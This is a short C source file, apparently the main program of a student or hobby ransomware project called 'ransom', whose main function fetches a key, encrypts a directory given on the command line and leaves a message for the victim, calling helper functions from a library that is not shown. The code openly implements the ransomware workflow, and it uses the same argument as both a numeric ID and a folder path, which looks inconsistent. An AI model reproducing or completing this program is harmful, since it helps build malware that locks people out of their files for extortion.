#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "src/libcom.h"

void test(int my_variable) {
	for(int i = 0; i < my_variable; i++) {
		printf("-> %d\n", my_variable);
	}
}

void usage() {
	printf("Usage : ./ransom <file>\n");
}

int main (int argc, char **argv){
	if (argc != 2) {
		usage();
		return 0;
	}
  int ID = 0;
  if(argc == 2){
    ID = atoi(argv[1]);
  }
  // get the key
  char* key;
  key = getKey(ID);
  // encrypt the folder
  encDir(argv[1], key);
  free(key);
  // leave a message to the user
  leaveExplanation();
  return 0;
}
